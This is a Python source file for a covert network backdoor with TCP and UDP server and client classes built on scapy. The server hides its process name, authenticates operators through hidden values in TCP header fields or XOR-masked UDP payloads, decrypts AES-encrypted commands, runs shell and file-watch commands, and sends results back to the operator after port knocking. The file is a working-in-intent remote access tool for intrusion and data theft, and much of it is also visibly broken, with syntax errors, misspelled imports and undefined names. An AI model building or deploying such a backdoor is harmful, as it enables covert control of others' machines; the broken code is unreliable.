from __future__ import print_function
from Queue import Queue
from scapy.all import *
from setproctitle import setproctitle, getproctitle
from Threading import Thread

import command
import Crypto.Cipher
import struct
import sys
import time
import traceback

PASSWORD_LEN=8

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

def make_iv():
    """Creates a 16-byte initialisation vector for AES encryption using the current time."""

    timestamp = time.time()

    # for the forseeable future, timestamp is representable in 4 bytes
    iv = struct.pack("<IIII", timestamp, timestamp, timestamp, timestamp)
    return iv

class BackdoorServer(object):

    def __init__(self, procname, aeskey, password, clientport):
        """Initialises a backdoor server with the given settings.
        
        Positional arguments:
        procname - the name with which to replace the current process's name. cannot contain spaces.
        aeskey   - a "secret" pre-shared key to use for AES encryption. the client and server will already know this key.
        password - a password to authenticate clients and ensure that decryption succeeded.
        clientport - The port on which the server will connect back to clients to send command results.
        """
        self.procname = procname
        self.aeskey = aeskey
        self.password = password
        self.client = None
        self.dport = clientport

    def mask_process(self):
        """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
        setproctitle(self.procname)

    def recv(self):
        """Receives and returns bytes from the next packet sent from a connected client.
        
        Returns a bytes object containing the packet's payload.
        """
        raise NotImplementedError

    def listen(self):
        """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
        raise NotImplementedError

    def port_knock(self, knocked_ports):
        """Knock on ports decided by user"""
        for port in knocked_ports:
            send(IP(dst=self.client)/TCP(dport=port),verbose=0)
        

    def recv_command(self, queue):
        """Receives and deserialises the next command from the connected client.
        
        Returns the received command as a Command object.
        """
        # Continue looping until we get a command
        # Ignore any packets that can't be decrypted or don't have the password in them
        while True:
            buf = self.recv()
            if len(buf) < 16:
                continue

            iv = buf[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
            decrypted = decryptor.decrypt(buf[16:])

            if len(decrypted) < PASSWORD_LEN + 1: # password length + command byte
                continue

            # We may have had to pad the payload for encryption; the size of the payload without
            # padding is stored in the first 4 bytes
            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
            start = 4
            if decrypted[start:start+PASSWORD_LEN] == self.password:
                start += PASSWORD_LEN
                cmdbytes = decrypted[start:start+nopaddinglen]
                cmdtype = cmdbytes[0] if isinstance(cmdbytes[0], int) else ord(cmdbytes[0])

                if cmdtype == command.Command.SHELL:
                    cmd = command.ShellCommand.from_bytes(cmdbytes)
                elif cmdtype == command.Command.WATCH:
                    cmd = command.WatchCommand.from_bytes(cmdbytes)
                elif cmdtype == command.Command.END:
                    cmd = None
                else:
                    raise ValueError("Unknown command type {}".format(cmdtype))

                return cmd


    def result_queue(self, queue):
        while True:
            result = queue.pop()
            self.send_result(result)


    def send_result(self, queue, result):
        """Sends the results of a command execution to the client.

        Positional arguments:
        result - A Result object containing the command's result.
        """

        retry_count = 5
        knock_wait_time = 0.5
        sock_timeout = 1

        covert_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        covert_sock.settimeout(sock_timeout)

        for i in range(0, retry_count):
            self.port_knock()
            time.sleep(knock_wait_time)
            result = covert_sock.connect_ex((self.client, self.dport))
            if result == 0:
                break

        if result != 0:
            print("Client connection retries exceeded. Failed to send result.")
            return

        # First packet structure:
        # - 16 bytes: initialisation vector
        # - 4 bytes: random padding bytes for crypto alignment
        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
        # - 8 bytes: password
        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes

        first_packet_payload_max = PACKET_SIZE - 16 - 4 - 4 - 8
        other_packet_payload_max = PACKET_SIZE - 8

        iv = make_iv()
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)

        start_padding = random.random(2147483647, 4294967295)

        result_bytes = result.to_bytes()
        result_len = len(result_bytes)

        payload = struct.pack("<I", start_padding)
        payload += struct.pack("<I", result_len)
        payload += self.password
        payload += result_bytes[:min(len(result_bytes), first_packet_payload_max]
        if result_len < first_packet_payload_max:
            with open('/dev/random', 'r') as randfile:
                remainder = first_packet_payload_max - result_len
                payload += randfile.read(remainder)

        payload = encryptor.encrypt(payload)
        payload = iv + payload
    
        try:
            covert_sock.sendall(payload)
        except Exception, e:
            print("Exception while transmitting result: {}".format(str(e))
            covert_sock.shutdown(socket.SHUT_RDWR)
            return

        if result_len > first_packet_payload_max:
            offset = first_packet_payload_max
            result_len -= first_packet_payload_max
            while result_len:
                # Subsequent packets (if the result didn't fit in the first one):
                # - 8 bytes: password
                # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
                result_chunk_size = min(result_len, other_packet_payload_max)
                payload = self.password
                payload += result_bytes[offset:result_chunk_size]

                if result_chunk_size < other_packet_payload_max:
                    with open('/dev/random', 'r') as randfile:
                        remainder = other_packet_payload_max - result_chunk_size
                        payload += randfile.read(remainder)

                try:
                    covert_sock.sendall(payload)
                except Exception, e:
                    print("Exception while transmitting result: {}".format(str(e))
                    covert_sock.shutdown(socket.SHUT_RDWR)
                    return

                result_len -= result_chunk_size
                offset += result_chunk_size

        covert_sock.shutdown(socket.SHUT_RDWR)

    def run(self):
        """Runs in a loop listening for clients and serving their requests."""
        self.mask_process()

        queue = Queue(maxsize=0)        

        while True:
            print("Waiting for client...")
            
            # TODO: Why is this a loop?
            while not self.client:
                self.listen()

            
            result_send = Thread(target=self.result_queue, args(queue,))
            result_send.setDaemon(True)
            
            print("Client connected: {}".format(self.client))
            while True:
                try:
                    cmd = self.recv_command()
                    if not cmd:
                        print("{} disconnected.".format(self.client))
                        self.client = None
                        break
                    file_watch = Thread(target=cmd.run, args(queue,))
                    file_watch.setDaemon(True)
                    #result = cmd.run()

                    print("")
                    print(str(cmd))
                    #print(str(result))
                    print("")

                    result_send.start()
                    file_watch.start()

                except KeyboardInterrupt:
                    print("see ya")
                    sys.exit(0)

                except Exception, err:
                    traceback.print_exc()
                    break

class TcpBackdoorServer(BackdoorServer):

    def __init__(self, procname, aeskey, password, clientport, listenport):
        """Creates a new TcpBackdoorServer with the specified settings.
        
        Positional arguments:
        listenport - The port on which the backdoor server will listen for clients.
        """
        super(TcpBackdoorServer, self).__init__(procname, aeskey, password, clientport)
        self.lport = listenport

    def listen(self):
        # Create a new random source port from which to send
        self.sport = RandShort()

        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we probably have a client
        def is_auth(packet):
            if len(packet["TCP"].options) == 0:
                return False

            mss = next((v for i, v in enumerate(packet["TCP"].options) if v[0] == "MSS"), None)
            if not mss:
                return False

            mss = mss[1] # Get the actual MSS value from the tuple

            window = packet["TCP"].window
            isn = packet["TCP"].seq

            pw = struct.pack("<HHI", mss, window, isn)
            if pw == self.password:
                self.client = packet["IP"].src
                return True
            else:
                return False

        bpf_filter = "tcp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.client, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload)

    def send(self, payload):
        # TODO: Remove this
        try:
            packet = IP(dst=self.client)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                     / Raw(load=payload)
            send(packet)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

class UdpBackdoorServer(BackdoorServer):
    def __init__(self, procname, aeskey, password, clientport, listenport):
        """Creates a new UdpBackdoorServer with the specified settings.
        
        Positional arguments:
        listenport - The port on which the backdoor server will listen for clients.
        """
        super(UdpBackdoorServer, self).__init__(procname, aeskey, password, clienport)
        self.lport = listenport

    def listen(self):
        # Create a new random source port from which to send
        self.sport = RandShort()

        # If payload xor ((packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)) == pw, we have a client
        def is_auth(packet):
            if len(packet["UDP"].payload) != 8:
                return False

            int_payload = struct.unpack("<Q", packet["UDP"].payload)[0]
            xor_mask = (packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)
            pw = struct.pack("<Q", int_payload ^ xor_mask)

            if pw == self.password:
                self.client = packet["IP"].src
                return True
            else:
                return False

        bpf_filter = "udp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        bpf_filter = "src host {} and udp dst port {}".format(self.client, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["UDP"].payload)

    def send(self, payload):
        # TODO: Remove this
        pass

class BackdoorClient(object):

    def __init__(self, aeskey, password):
        """Creates a new backdoor client with the specified AES key and password.
        
        Positional arguments:
        aeskey   - a "secret" pre-shared key for AES encryption.
        password - a password to authenticate clients and ensure that decryption succeeded.
        """
        self.aeskey = aeskey
        self.password = password

    def connect(self):
        """Connects to the backdoor server.

        This may silently fail if the protocol doesn't implement acknowledgments on connect.
        """
        raise NotImplementedError

    def send(self, payload):
        """Sends the bytes in payload to the server.
        
        Positional arguments:
        payload - A bytes object to send to the server.
        """
        raise NotImplementedError

    def send_command(self, command):
        """Sends a command to the server for remote execution or to signal the end of the connection.
        
        Positional arguments:
        command - A Command object that will be serialised, encrypted, and sent to the server.
        """
        iv = make_iv()
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = self.password + command.to_bytes()
        payload = struct.pack("<I", len(payload)) + payload
        
        # blocks have to be padded to multiples of 16 bytes for AES
        remainder = len(payload) % Crypto.Cipher.AES.block_size
        if remainder:
            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)

        payload = encryptor.encrypt(payload)
        payload = iv + payload

        self.send(payload)

    def recv_result(self):
        """Receives the results of a command's execution from the server.
        
        Returns a Result object containing the command's result.
        """
        while True:
            # TODO: Change this to use new logic described in BackdoorSever.send_result
            raw = self.recv()
            if len(raw) < 16:
                continue

            iv = raw[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)           
            decrypted = decryptor.decrypt(raw[16:])
            
            if len(decrypted) < PASSWORD_LEN + 1: # password + command byte
                continue

            # We may have had to pad the payload for encryption; the size of the payload without
            # padding is stored in the first 4 bytes
            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
            start = 4

            if decrypted[start:start+PASSWORD_LEN] == self.password:
                start += PASSWORD_LEN
                resultbytes = decrypted[start:start+nopaddinglen]
                resulttype = resultbytes[0] if isinstance(resultbytes[0], int) else ord(resultbytes[0])

                if resulttype == command.Command.SHELL:
                    return command.ShellCommand.Result.from_bytes(resultbytes)
                elif resulttype == command.Command.WATCH:
                    return command.WatchCommand.Result.from_bytes(resultbytes)
                else:
                    print("Unhandled result type {}".format(resulttype))
                    sys.exit(1)

    def run(self):
        """Runs in a loop listening for the server and serving their requests."""
        self.mask_process()

        queue = Queue(maxsize=0)        

        while True:
            print("Waiting for Server...") #DELETE AFTER
            
            # TODO: Why is this a loop?
            while not self.server:
                self.listen()
            result_recv = Thread(target=self.recv_result, args(queue,result))
            command_send = Thread(target=self.send_command, args(queue,))
            result_recv.setDaemon(True)
            command_send.setDaemon(True)
            
            print("Server connected: {}".format(self.client))
            while True:
                try:
                    result_recv.start()
                    command_send.start()
                    
                except KeyboardInterrupt:
                    print("see ya")
                    sys.exit(0)

                except Exception, err:
                    traceback.print_exc()
                    break

class TcpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, listenport, serverport, server):
        super(TcpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        mss, windowsize, isn = struct.unpack("<HHI", self.password)

        self.sport = RandShort()
        self.seq = isn

        try:
            connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
            send(connpacket)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, seq=self.seq, flags=PSH|ACK)\
                     / Raw(load=payload)

            self.seq += len(payload)
            send(packet)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload.load)

class UdpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, listenport, serverport, server):
        super(TcpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        self.sport = RandShort()
        xor_mask = self.sport << 48 + self.sport << 32 + self.sport << 16 + self.sport
        masked_pw = struct.pack("<Q", struct.unpack("<Q", self.password)[0] ^ xor_mask)

        try:
            connpacket = IP(dst=self.server) / UDP(dport=self.dport, sport=self.sport) / Raw(load=masked_pw)
            send(connpacket)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / UDP(dport=self.dport, sport=self.sport)\
                     / Raw(load=payload)

            send(packet)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload.load)
